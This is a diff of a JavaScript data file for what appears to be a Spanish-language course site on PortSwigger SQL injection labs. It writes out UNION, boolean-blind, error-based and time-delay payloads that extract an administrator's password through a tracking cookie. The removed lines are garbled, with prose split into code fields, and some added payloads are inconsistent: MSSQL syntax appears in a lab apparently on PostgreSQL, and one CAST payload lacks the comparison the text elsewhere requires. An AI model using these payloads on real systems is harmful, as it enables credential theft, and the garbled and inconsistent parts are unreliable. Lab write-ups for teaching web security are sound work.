+        impact: "Técnica que permite superar la limitación de columnas disponibles, demostrando la flexibilidad de los ataques UNION. Aunque solo haya una columna de texto visible, el atacante puede exfiltrar múltiples campos concatenados.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder a una de las categorías disponibles en la página (ej. \"Accesorios\" o \"Regalos\") .",
-                code: ""
+                title: "Identificación de la columna disponible",
+                text: "La consulta retorna 2 columnas pero solo la segunda acepta strings. La primera es numérica. Se confirma con NULL en la primera posición y 'a' en la segunda.",
+                code: "' UNION SELECT NULL, 'a'--"
             },
             {
-                title: "Paso 3",
-                text: "Se inyecta el siguiente código:",
-                code: "Determinar el número de columnas de la tabla, utilizando un ‘ UNION SELECT NULL,"
+                title: "Concatenación con operador ||",
+                text: "Se construye la concatenación usando el operador || de PostgreSQL. Se incluye un separador ~ para distinguir el username de la contraseña al leer el resultado.",
+                code: "' UNION SELECT NULL, username||'~'||password FROM users--"
             },
             {
-                title: "Paso 4",
-                text: "NULL- - y probando hasta que no haya error. En este caso, se confirma que hay dos columnas. Determinar el tipo de datos de cada columna. Probar con un 'string' en la primera columna y ver que da error, indicando que es numérica. Probar con 'string' en la segunda columna y ver que no da error, indicando que acepta texto. Inyectar el payload para extraer datos. Se recomienda usar la concatenación de la primera columna (username) y la segunda (password) de la tabla users . El payload",
-                code: ""
+                title: "Lectura del resultado concatenado",
+                text: "La respuesta muestra cadenas del tipo 'administrator~s3cr3t'. Se separa por el delimitador ~ para obtener el par usuario-contraseña limpio.",
+                code: "administrator~s3cr3tpass  →  admin : s3cr3tpass"
             },
             {
-                title: "Paso 11",
-                text: "Se inyecta el siguiente código:",
-                code: "sería similar a: UNION SELECT NULL, username || ':' || password FROM users--. Se"
-            },
-            {
-                title: "Paso 12",
-                text: "introduce un punto y coma como separador entre el usuario y la contraseña. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador” . Ir a la sección \"My account\" y loguearse con la contraseña obtenida. Confirmación: Inicio de sesión exitoso como administrador y el laboratorio se marca como resuelto. La parte SELECT NULL, username || ':' || password FROM  users solicita a la base de datos que busque en la tabla users y traiga los valores de las  columnas username y password, concatenados y separados por un carácter. La  cláusula UNION hace que estos datos se añadan a la consulta original y aparezcan  donde normalmente estarían los nombres de los productos, en la segunda columna que  acepta strings.",
-                code: ""
-            },
+                title: "Acceso",
+                text: "Se usa la contraseña extraída para iniciar sesión como administrador. El laboratorio queda resuelto al acceder exitosamente a la cuenta.",
+                code: "HTTP/1.1 302 Found → /my-account?id=administrator"
+            }
         ],
         images: [
             "parcial2/act08_images/P12_img53.png",
@@ -354,113 +389,38 @@ const labsData = [
         title: "Blind SQL injection with conditional responses",
         type: "Blind",
         level: "Practitioner",
-        payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
-        description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.",
-        objective: "Obtener el usuario y la contraseña del administrador de la  tabla users.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "Este tipo de ataque de inyección SQL no muestra errores o  información directamente en la página. En su lugar, el atacante deduce la información a  través de la respuesta del servidor a consultas condicionales, como la aparición o  ausencia de un mensaje específico en la página (\"Welcome Back\" en este caso) o  diferencias en el tiempo de respuesta. Esto permite al atacante extraer datos carácter  por carácter.",
-        impact: "endada: Validación de entradas y consultas parametrizadas: Utilizar  sentencias preparadas o consultas parametrizadas para separar el código SQL de los  datos de entrada del usuario. Esto previene que los comandos inyectados sean  ejecutados .  Sanitización estricta de entradas: Validar las entradas del usuario contra formatos  esperados y rechazar caracteres maliciosos .  Principio de mínimo privilegio: Configurar las cuentas de base de datos utilizadas  por la aplicación web con los permisos mínimos necesarios. Incluso si ocurre una  inyección, el daño estará limitado.  Manejo de errores no detallado: Evitar mostrar errores detallados de la base de datos  a los usuarios. Los mensajes genéricos impiden que los atacantes confirmen  inyecciones exitosas.  Web Application Firewalls (WAFs): Implementar WAFs con análisis de  comportamiento para detectar patrones indicativos de inyecciones SQL ciegas, como  consultas frecuentes y ligeramente variadas que desencadenan diferentes estados  HTTP o tiempos de respuesta.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' AND '1'='1",
+        description: "Exfiltración de datos carácter a carácter mediante inyección ciega booleana observando cambios en el mensaje 'Welcome Back'.",
+        objective: "Determinar la contraseña del administrador carácter a carácter explotando una inyección SQL ciega basada en respuestas condicionales booleanas en la cookie TrackingId.",
+        analysis: "La aplicación no muestra resultados SQL pero sí muestra el mensaje 'Welcome Back' cuando la condición es verdadera. Esto permite construir preguntas booleanas: ¿el primer carácter de la contraseña es 'a'? Si es sí → aparece el mensaje. Se automatiza con Burp Intruder o scripts Python para extraer cada carácter.",
+        impact: "Aunque más lento que ataques UNION, la inyección ciega booleana es completamente funcional para extraer cualquier dato de la base de datos. La automatización con Burp Intruder puede obtener contraseñas de 20 caracteres en minutos.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder al laboratorio y observar el comportamiento de la aplicación: Navegar por las categorías (ej. \"Accessories\"). Identificar el campo vulnerable (Cookies): Utilizar Burp Suite para interceptar la solicitud y modificar el valor de la cookie",
-                code: ""
+                title: "Confirmación de la inyección ciega",
+                text: "Se modifica el valor de la cookie TrackingId inyectando condiciones booleanas. Si la condición es verdadera (1=1), aparece 'Welcome Back'. Si es falsa (1=2), desaparece.",
+                code: "TrackingId=xyz' AND '1'='1  → Welcome Back visible"
             },
             {
-                title: "Paso 5",
-                text: "Se inyecta el siguiente código:",
-                code: "TrackingId."
+                title: "Confirmación de existencia del usuario",
+                text: "Se verifica que el usuario administrator existe en la tabla users usando una subconsulta booleana.",
+                code: "TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--"
             },
             {
-                title: "Paso 6",
-                text: "Se inyecta el siguiente código:",
-                code: "Insertar una comilla simple ' en el valor de TrackingId y enviar la solicitud."
+                title: "Determinación de la longitud de la contraseña",
+                text: "Se usa LENGTH() para determinar cuántos caracteres tiene la contraseña. Se incrementa el valor hasta que 'Welcome Back' desaparece.",
+                code: "TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--"
             },
             {
-                title: "Paso 7",
-                text: "Observar que el mensaje \"Welcome Back\" desaparece, lo que indica una inyección SQL efectiva Confirmar la existencia de la tabla users:",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "Se inyecta el siguiente código:",
-                code: "Inyectar el siguiente payload en el valor de la cookie TrackingId: ' AND (SELECT 'a'"
-            },
-            {
-                title: "Paso 11",
-                text: "FROM users WHERE 'a'='a' LIMIT 1)-- Si la tabla users existe, el mensaje \"Welcome Back\" reaparecerá . Si no, desaparecerá. Confirmar la existencia del usuario administrator: Inyectar el siguiente payload: ' AND (SELECT username FROM users WHERE",
-                code: ""
-            },
-            {
-                title: "Paso 15",
-                text: "Se inyecta el siguiente código:",
-                code: "username = 'administrator') = 'administrator'--"
-            },
-            {
-                title: "Paso 16",
-                text: "Si el usuario administrator existe, el mensaje \"Welcome Back\" reaparecerá.Si no, desaparecerá. Determinar la longitud de la contraseña del administrador: Inyectar payloads para probar la longitud de la contraseña. Por ejemplo, para saber si es mayor a 19 caracteres: ' AND (SELECT username FROM users WHERE username",
-                code: ""
-            },
-            {
-                title: "Paso 21",
-                text: "Se inyecta el siguiente código:",
-                code: "= 'administrator' AND LENGTH(password) > 19) = 'administrator'--"
-            },
-            {
-                title: "Paso 22",
-                text: "Ajustar el número hasta que el mensaje \"Welcome Back\" reaparezca, indicando la longitud correcta (la contraseña tiene 20 caracteres). El payload base para cada carácter es: ' AND (SELECT SUBSTRING(password, {posición_caracter}, 1) FROM users WHERE username = 'administrator') =",
-                code: ""
-            },
-            {
-                title: "Paso 26",
-                text: "Se inyecta el siguiente código:",
-                code: "'{caracter_a_probar}'--"
-            },
-            {
-                title: "Paso 27",
-                text: "Si el carácter probado en la posición actual es correcto, el mensaje \"Welcome Back\" reaparecerá. El script registrará el carácter y pasará a la siguiente posición. Se usará un script de Python que automatiza este proceso. request:  para  hacer peticiones al servidor. string: añadir los caracteres que queremos que se prueben. urllib.parse: para evitar el https del servidor. urllib3: para python 3 Funcionamiento del codigo:",
-                code: ""
-            },
-            {
-                title: "Paso 35",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ \"TrackingId=\": Es el prefijo de la cookie vulnerable."
-            },
-            {
-                title: "Paso 36",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ \"o539b7p1d9s8z9o5\": Es el valor original de la cookie TrackingId."
-            },
-            {
-                title: "Paso 37",
-                text: "\"';\": Se añade para cerrar la instrucción SQL original y permitir la inyección. payload_url.format(i, char): Aquí es donde la plantilla del payload se formatea con la posición actual (i) y el carácter a probar (char). requests.get(url, ...): Envía una petición GET a la url del laboratorio.",
-                code: ""
-            },
-            {
-                title: "Paso 41",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ cookies={'TrackingId': cookie}: Establece el valor de la cookie TrackingId con el"
-            },
-            {
-                title: "Paso 42",
-                text: "payload SQL construido. verify=False: Desactiva la verificación del certificado SSL/TLS del servidor, lo que a menudo es necesario en entornos de prueba o si hay problemas con los certificados. if \"Welcome back\" in r.text:: El script verifica si el mensaje \"Welcome back\"",
-                code: ""
-            },
-            {
-                title: "Paso 47",
-                text: "Se inyecta el siguiente código:",
-                code: "aparece en el texto de la respuesta HTTP. Si el mensaje está presente, significa"
-            },
-            {
-                title: "Paso 48",
-                text: "que la condición SQL inyectada fue verdadera, y por lo tanto, el carácter adivinado es correcto para esa posición. contraseña += char: Si el carácter es correcto, se añade a la variable contraseña. break: Una vez que se encuentra el carácter correcto para la posición actual, el bucle interior se rompe, y el script pasa a la siguiente posición de la contraseña. Damos permisos al archivo y lo ejecutamos para obtener la contraseña , es importante decir que al reiniciar el laboratorio la cookie cambia por lo tanto la contraseña tambien lo hará. Iniciar sesión con las credenciales obtenidas: Una vez que el script haya extraído la contraseña completa, ir a la sección \"My account\" del laboratorio. Ingresar administrator como nombre de usuario y la contraseña obtenida. Iniciar sesión para resolver el laboratorio. Los payloads utilizan operadores lógicos (AND) y funciones  SQL (SELECT, LENGTH, SUBSTRING) dentro de la sección de la cookie TrackingId.  Esto permite al atacante construir consultas que, aunque no devuelven datos  directamente, alteran el comportamiento de la página (el mensaje \"Welcome Back\") de  una manera que revela información sobre la base de datos de forma ciega.",
-                code: ""
-            },
+                title: "Extracción carácter a carácter",
+                text: "Con SUBSTRING(), se extrae cada carácter de la contraseña probando cada posible valor. Burp Intruder automatiza este proceso con el conjunto de caracteres [a-z0-9].",
+                code: "TrackingId=xyz' AND SUBSTRING(password,1,1)='a'--  (iterar por posición y carácter)"
+            }
         ],
         images: [
-            "parcial2/act08_images/P12_img53.png",
-            "parcial2/act08_images/P12_img54.png",
             "parcial2/act08_images/P13_img57.png",
             "parcial2/act08_images/P13_img58.png",
+            "parcial2/act08_images/P14_img61.png",
+            "parcial2/act08_images/P14_img62.png",
         ]
     },
     {
@@ -468,23 +428,38 @@ const labsData = [
         title: "Blind SQL injection with conditional errors",
         type: "Blind",
         level: "Practitioner",
-        payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
-        description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.",
-        objective: "Obtener la contraseña del usuario administrador y usarla  para iniciar sesión.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "Este tipo de ataque de SQL Injection no muestra los resultados  directamente en la pantalla. En su lugar, se infiere la información observando si la  consulta inyectada provoca un error en la base de datos o si devuelve un código de  estado 200. Al generar errores controlados basándose en condiciones verdaderas o  falsas, se puede determinar la existencia de tablas, usuarios o caracteres específicos  de la contraseña.",
-        impact: "Peligro Inminente. Se requiere parchear.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM dual)='a",
+        description: "Exfiltración mediante inyección ciega basada en errores condicionales cuando no existe diferencia en la respuesta booleana.",
+        objective: "Extraer la contraseña del usuario administrator usando inyección ciega basada en errores: la base de datos genera un error solo cuando la condición es verdadera.",
+        analysis: "Cuando la aplicación no muestra diferencia visual según la condición booleana, se recurre a error-based blind SQLi. La técnica usa CASE WHEN: si la condición es verdadera, ejecuta 1/0 (división por cero = error HTTP 500). Si es falsa, retorna una cadena válida (respuesta 200). El código HTTP actúa como oráculo.",
+        impact: "Aplicable en escenarios donde la aplicación maneja respuestas idénticas para condiciones verdaderas/falsas, pero sí diferencia entre errores del servidor (500) y respuestas exitosas (200). Extiende enormemente el alcance de los ataques ciegos.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Acceder al laboratorio y comprender la vulnerabilidad: Ingresar al laboratorio y observar que las categorías no son vulnerables. Identificar que la inyección se realiza en el campo tracking ID de las cookie como indica en el lab. Modificar el tracking ID y verificar que una comilla simple (') genera un error , confirmando la vulnerabilidad. Preparar Burp Suite para la inyección: Interceptar la petición y enviarla al Repeater. Determinar el tipo de base de datos: Inyectar un payload de prueba como ' || (SELECT '') || ' y observar que genera un error",
-                code: ""
+                title: "Verificación de error condicional",
+                text: "Se confirma que se puede provocar un error a voluntad. Con CASE WHEN 1=1 se ejecuta 1/0 (error). Con CASE WHEN 1=2 no hay error.",
+                code: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM dual)='a"
             },
+            {
+                title: "Verificación de existencia del usuario",
+                text: "Se sustituye la condición 1=1 por la verificación de que administrator existe como usuario. Un HTTP 500 confirma que sí existe.",
+                code: "' AND (SELECT CASE WHEN (username='administrator') THEN 1/0 ELSE 'a' END FROM users)='a"
+            },
+            {
+                title: "Extracción de la contraseña",
+                text: "Se construye el payload para extraer cada carácter de la contraseña. Un error 500 indica que el carácter en esa posición coincide con el valor probado.",
+                code: "' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a"
+            },
+            {
+                title: "Automatización con Burp Intruder",
+                text: "Se automatizan las 20 posiciones × el conjunto de caracteres con Burp Intruder en modo Cluster Bomb. Las respuestas HTTP 500 marcan el carácter correcto en cada posición.",
+                code: "HTTP 500 → carácter correcto detectado / HTTP 200 → incorrecto, continuar"
+            }
         ],
         images: [
-            "parcial2/act08_images/P13_img57.png",
-            "parcial2/act08_images/P13_img58.png",
-            "parcial2/act08_images/P15_img64.png",
+            "parcial2/act08_images/P14_img61.png",
+            "parcial2/act08_images/P14_img62.png",
             "parcial2/act08_images/P15_img65.png",
+            "parcial2/act08_images/P15_img66.png",
         ]
     },
     {
@@ -492,103 +467,38 @@ const labsData = [
         title: "Visible error-based SQL injection",
         type: "Error-based",
         level: "Practitioner",
-        payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--",
-        description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.",
-        objective: "●​ Extraer la contraseña del usuario “administrator” de la tabla users.  ●​ Realiza un inicio de sesión exitoso con dichas credenciales para  comprometer la cuenta.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "El laboratorio presenta una vulnerabilidad en el manejo de  cookies de rastreo (tracking cookies). El flujo de explotación se resume en los  siguientes puntos:  ●​ Punto de Inyección: La aplicación toma el valor de la cookie enviada por  el navegador y lo concatena directamente en una consulta SQL interna.  ●​ Mecanismo de Error: Aunque la aplicación no muestra los resultados  directos de la consulta (los registros de la tabla), está configurada para  mostrar errores detallados de la base de datos cuando una consulta falla.  ●​ Estrategia de Explotación: Se debe inyectar una sintaxis SQL maliciosa  que fuerce un error de conversión o de tipo de dato. Por ejemplo, al  intentar convertir una cadena de texto (la contraseña que queremos  robar) en un número entero, la base de datos generará un error similar a:​ ERROR: invalid input syntax for type integer: \"S3cur3P4ssw0rd\"  ●​ Fuga de Datos (Data Leaking): Al leer ese mensaje de error en la  pantalla, el atacante obtiene el dato que la base de datos intentó procesar  infructuosamente, logrando así \"sacar\" información de tablas a las que no  debería tener acceso.",
-        impact: "endada:  En este escenario, el atacante aprovecha los mensajes técnicos para obtener  información. La estrategia debe ser doble:  ●​ Consultas Preparadas (Sentencias Parametrizadas): Esta es la defensa  principal. En lugar de concatenar la cookie directamente en el string SQL, se usa  un marcador de posición (?). El motor de la base de datos trata el valor de la  cookie como un simple dato y no como parte del código ejecutable.  ●​ Desactivar Mensajes de Error Detallados: En entornos de producción, la  aplicación nunca debe mostrar errores internos del motor de base de datos  (como tipos de datos o nombres de columnas). Se debe configurar una página  de error genérica para el usuario, mientras que el error real se guarda en un log  privado para los desarrolladores.  ●​ Validación de Entrada: Si la cookie de rastreo debe tener un formato específico  (por ejemplo, solo letras y números), se debe validar mediante una expresión  regular antes de procesarla.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)--",
+        description: "Exfiltración de datos mediante mensajes de error detallados del servidor que incluyen el valor del dato en el mensaje de conversión de tipos.",
+        objective: "Obtener la contraseña del administrador haciendo que el servidor incluya el valor de la contraseña directamente en el mensaje de error visible de la respuesta HTTP.",
+        analysis: "Algunos servidores de base de datos retornan mensajes de error muy detallados cuando se produce un fallo de conversión de tipos. Al intentar convertir (CAST) un string a integer, el error incluye el valor del string original: 'invalid input syntax for type integer: password_value'. El dato queda expuesto en el mensaje de error.",
+        impact: "Mucho más eficiente que la inyección ciega: se obtiene el dato completo en una sola petición en lugar de carácter a carácter. En producción, estos errores detallados son un fallo grave de configuración (verbose error messages) que debe estar deshabilitado.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Accederemos a la instancia que nos genere PortSwigger desde el navegador integrado de BurpSuite (sin tener activado el interceptor). Exploraremos la página para cargar distintas instancias. Una vez exploradas, irémos a",
-                code: ""
+                title: "Provocar un error de conversión de tipos",
+                text: "Se inyecta en la cookie TrackingId un CAST que intenta convertir un string a integer. La base de datos falla e incluye el valor del string en el mensaje de error.",
+                code: "TrackingId=xyz' AND CAST((SELECT 1) AS int)--"
             },
             {
-                title: "Paso 4",
-                text: "Se inyecta el siguiente código:",
-                code: "la pestaña “Proxy”, a la sección “HTTP History”, y buscarémos cualquier petición GET ​"
+                title: "Extracción del username",
+                text: "Se dirige el CAST hacia el campo username de la tabla users. El error del servidor mostrará el nombre de usuario en el mensaje.",
+                code: "TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
             },
             {
-                title: "Paso 5",
-                text: "Se inyecta el siguiente código:",
-                code: "que contenga la Cookie “TrackingId”, y la envíamos al repetidor."
+                title: "Extracción de la contraseña",
+                text: "Una vez confirmado el usuario, se extrae la contraseña de la misma forma. El error de conversión expone la contraseña en texto plano en la respuesta.",
+                code: "TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
             },
             {
-                title: "Paso 6",
-                text: "Regresarémos a BurpSuite y enviaremos esa petición al repetidor. Al final del valor de",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "Se inyecta el siguiente código:",
-                code: "la Cookie de TrackingId, añadirémos una comilla simple, y enviaremos la solicitud por"
-            },
-            {
-                title: "Paso 8",
-                text: "medio del repetidor. Al enviarla y explorar en el contenido HTML, podemos observar que nos muestra un error de consulta SQL.  Ahora sabemos que el contenido de la cookie sirve para realizar una consulta SQL. Añadirémos los caracteres de comentario (“--” en SQL) Si no nos muestra ningún error significa que nuestra consulta será válida de manera sintática. Después de la comilla simple, añadiremos la consulta “AND CAST((SELECT 1)) AS int)--”. De esta manera adaptaremos la consulta para incluir una subconsulta SELECT genérica y convertir el valor devuelto a un tipo de datos int. Como podremos ver, al enviar la solicitud nos arroja un error diciendo que la condición “AND” debe ser una exrpesión booleana. Modificaremos la condición, añadiendo un",
-                code: ""
-            },
-            {
-                title: "Paso 19",
-                text: "Se inyecta el siguiente código:",
-                code: "operador de comparació: “AND 1=CAST((SELECT 1) AS int)--.”"
-            },
-            {
-                title: "Paso 20",
-                text: "Al ejecutarla nos podremos dar cuenta que no arroja ningún error, por lo que la consulta SQL ahora tendrá la sintáxis correcta. Ahora, para la inyección, adaptaremos un SELECT genérico para que recupere los",
-                code: ""
-            },
-            {
-                title: "Paso 23",
-                text: "Se inyecta el siguiente código:",
-                code: "nombres de usuario de la base de datos: “AND 1=CAST((SELECT username FROM"
-            },
-            {
-                title: "Paso 24",
-                text: "users) AS int)--”. Obtendremos un error de nuevo. Nuestra consulta parece haberse truncado por el límite de caracteres permitido. Como resultado, los caracteres que añadimos para comentar la consulta (“--”) se ignoraron. Para solucionar esto, eliminaremos el contenido original de la cookie, para, de esta manera, liberar algunos caracteres,",
-                code: ""
-            },
-            {
-                title: "Paso 29",
-                text: "Se inyecta el siguiente código:",
-                code: "quedándonos solo como “TrackingId=' AND 1=CAST((SELECT username FROM users)"
-            },
-            {
-                title: "Paso 30",
-                text: "AS int)--”. Observamos que recibimos un nuevo mensaje de error, que parece haber sido generado por la base de datos. Esto sugiere que la consulta se ejecutó correctamente, pero sigue recibiendo un error porque la consulta devolvió más de una fila. La",
-                code: ""
-            },
-            {
-                title: "Paso 34",
-                text: "Se inyecta el siguiente código:",
-                code: "modificaremos para que solo regrese una sola columna: “TrackingId=' AND"
-            },
-            {
-                title: "Paso 35",
-                text: "Se inyecta el siguiente código:",
-                code: "1=CAST((SELECT username FROM users LIMIT 1) AS int)--”."
-            },
-            {
-                title: "Paso 36",
-                text: "Ya enviada la consulta, sabremos que el primer usuario en nuestra tabla es “administrator”. Ahora modificaremos la consulta para que nos muestre la contraseña:",
-                code: ""
-            },
-            {
-                title: "Paso 38",
-                text: "Se inyecta el siguiente código:",
-                code: "“TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--”."
-            },
-            {
-                title: "Paso 39",
-                text: "La contraseña se ha filtrado, siendo “n0qruhn61643ghsw146z”. Ahora podremos iniciar sesión con el usuario administrador y su contraseña, y de esta manera, completar el laboratorio.",
-                code: ""
-            },
+                title: "Acceso",
+                text: "La contraseña queda expuesta en el mensaje de error: 'invalid input syntax for type integer: s3cr3tpass'. Se usa para iniciar sesión como administrador.",
+                code: "HTTP 500 → ERROR: invalid input syntax for type integer: 'adminpassword'"
+            }
         ],
         images: [
-            "parcial2/act08_images/P15_img64.png",
             "parcial2/act08_images/P15_img65.png",
-            "parcial2/act08_images/P16_img68.png",
+            "parcial2/act08_images/P15_img66.png",
             "parcial2/act08_images/P16_img69.png",
+            "parcial2/act08_images/P16_img70.png",
         ]
     },
     {
@@ -596,48 +506,38 @@ const labsData = [
         title: "Blind SQL injection with time delays",
         type: "Blind (Time)",
         level: "Practitioner",
-        payload: "x'%3bSELECT+pg_sleep(10)--",
-        description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.",
-        objective: "Explotar la vulnerabilidad para pausar la ejecución de la  consulta y provocar un retraso de 10 segundos en la respuesta de la aplicación.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "A diferencia de otros tipos de SQLi, en este caso el servidor ha  sido configurado para no mostrar diferencias visuales si la consulta falla o tiene éxito.  La lógica de ataque se basa en lo siguiente:  ●​ Inyección en la Cookie: Al igual que en el caso anterior, el punto de entrada es  la tracking cookie. El servidor ejecuta la consulta de forma síncrona, lo que  significa que la página web no terminará de cargar hasta que la base de datos  termine su proceso.  ●​ Uso de Funciones de Tiempo: El atacante inserta comandos que obligan a la  base de datos a \"esperar\". Dependiendo del motor de base de datos  (PostgreSQL, MySQL, Microsoft SQL Server), se utilizan funciones como:  ○​ pg_sleep(10)  ○​ WAITFOR DELAY '0:0:10'  ○​ SLEEP(10)  ●​ Confirmación de Vulnerabilidad: Si al enviar la cookie modificada la página  tarda exactamente 10 segundos adicionales en cargar, se confirma que el código  inyectado fue ejecutado por el motor de base de datos.  ●​ Extracción de Datos (Teórica): Aunque el objetivo aquí es solo el retraso, esta  técnica permite extraer información mediante condiciones: \"Si la primera letra de  la contraseña es 'A', espera 10 segundos; si no, responde de inmediato\".",
-        impact: "endada:  Dado que aquí no hay errores visibles, la mitigación se centra en evitar que el atacante  pueda \"comunicarse\" con la base de datos a través del tiempo de respuesta.  ●​ Uso estricto de ORMs o Sentencias Preparadas: Al igual que en el caso  anterior, usar herramientas como Entity Framework, Hibernate o PDO (con  parámetros) evita que comandos como pg_sleep() o WAITFOR DELAY sean  interpretados por la base de datos.  ●​ Limitación de Privilegios (Least Privilege): El usuario de la base de datos que  utiliza la aplicación web no debería tener permisos para ejecutar funciones de  sistema o de administración (como comandos de pausa o apagado) si no son  estrictamente necesarios para su función.  ●​ Web Application Firewall (WAF): Un WAF puede detectar patrones  sospechosos en las cookies, como palabras clave de SQL (SELECT, SLEEP,  UNION), y bloquear la solicitud antes de que llegue a la base de datos.  ●​ Timeouts en Consultas: Configurar un tiempo de espera máximo (timeout) para  las consultas en la base de datos. Si una consulta de una cookie tarda más de lo  normal (por ejemplo, más de 1 segundo), la conexión debe cortarse  automáticamente.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "'; IF (1=1) WAITFOR DELAY '0:0:10'--",
+        description: "Confirmación de inyección ciega mediante delays temporales cuando no existe ninguna diferencia observable en la respuesta HTTP.",
+        objective: "Verificar la existencia de una vulnerabilidad SQLi ciega en la cookie TrackingId provocando un retraso deliberado en la respuesta del servidor usando funciones de tiempo.",
+        analysis: "Cuando la aplicación procesa la cookie de forma asíncrona y nunca retorna diferencias en su respuesta, se recurre a time-based blind SQLi. Las funciones pg_sleep() (PostgreSQL), WAITFOR DELAY (MSSQL) o SLEEP() (MySQL) detienen la ejecución de la query un tiempo determinado. Si la respuesta tarda ese tiempo, el canal de inyección está confirmado.",
+        impact: "Confirma existencia de inyección incluso en aplicaciones completamente 'silenciosas'. Sirve como prueba forense de vulnerabilidad aunque no extraiga datos directamente. La técnica es fácilmente detectable por sistemas IDS que monitorean latencias anómalas.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Accederemos a la instancia de la práctica utilizando BurpSuite (sin interceptar). Iremos",
-                code: ""
+                title: "Prueba con condición siempre verdadera",
+                text: "Se inyecta una condición verdadera que activa el delay. Si la respuesta del servidor tarda exactamente 10 segundos, el canal de inyección está confirmado.",
+                code: "TrackingId=xyz'; SELECT pg_sleep(10)--"
             },
             {
-                title: "Paso 2",
-                text: "Se inyecta el siguiente código:",
-                code: "a HTML History y buscaremos aquella petición que contenga la Cookie “TrackingId”, y"
+                title: "Confirmación con condición específica",
+                text: "Se combina el delay con una condición de datos: si administrator existe, el servidor tardará 10s. Si no existe, responde inmediatamente.",
+                code: "TrackingId=xyz'; IF (SELECT COUNT(*) FROM users WHERE username='administrator')=1 WAITFOR DELAY '0:0:10'--"
             },
             {
-                title: "Paso 3",
-                text: "la envíamos al repetidor.",
-                code: ""
+                title: "Observación del timing",
+                text: "En Burp Suite Repeater se observa la columna de tiempo de respuesta. Una respuesta de ~10,000ms confirma que la condición fue verdadera y que el canal de inyección funciona.",
+                code: "Tiempo de respuesta: 10,127ms → Condición TRUE confirmada"
             },
             {
-                title: "Paso 4",
-                text: "Se inyecta el siguiente código:",
-                code: "Dentro del repetidor, cambiaremos el contenido de TrackingId por"
-            },
-            {
-                title: "Paso 5",
-                text: "Se inyecta el siguiente código:",
-                code: "“TrackingId=x'||pg_sleep(10)--” y enviaremos la solicitud. Al enviarla, podremos ver"
-            },
-            {
-                title: "Paso 6",
-                text: "cómo tardará 10 segundos en cargarla. Una vez cargada la solicitud, el laboratorio aparecerá como completado.",
-                code: ""
-            },
+                title: "Resultado",
+                text: "La inyección ciega basada en tiempo queda confirmada. Este resultado establece la base para ataques de extracción de datos carácter a carácter usando timing como oráculo.",
+                code: "HTTP/1.1 200 OK (después de 10s) → Blind SQL Injection por tiempo confirmada"
+            }
         ],
         images: [
-            "parcial2/act08_images/P15_img64.png",
-            "parcial2/act08_images/P15_img65.png",
-            "parcial2/act08_images/P16_img68.png",
             "parcial2/act08_images/P16_img69.png",
+            "parcial2/act08_images/P16_img70.png",
+            "parcial2/act08_images/P17_img73.png",
+            "parcial2/act08_images/P17_img74.png",
         ]
     },
     {
@@ -645,33 +545,38 @@ const labsData = [
         title: "Blind SQL injection with time delays and information retrieval",
         type: "Blind (Time)",
         level: "Practitioner",
-        payload: "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
-        description: "Comprobaciones algorítmicas demoradas como túnel lateral cronometrado avanzado de robo.",
-        objective: "●​ Determinar la longitud de la contraseña del usuario administrator.  ●​ Extraer cada carácter de dicha contraseña mediante ataques de fuerza bruta  basados en tiempo.  ●​ Iniciar sesión en la cuenta del administrador para resolver el laboratorio.",
-        analysis: "Análisis técnico de la inyección SQL en base de datos.",
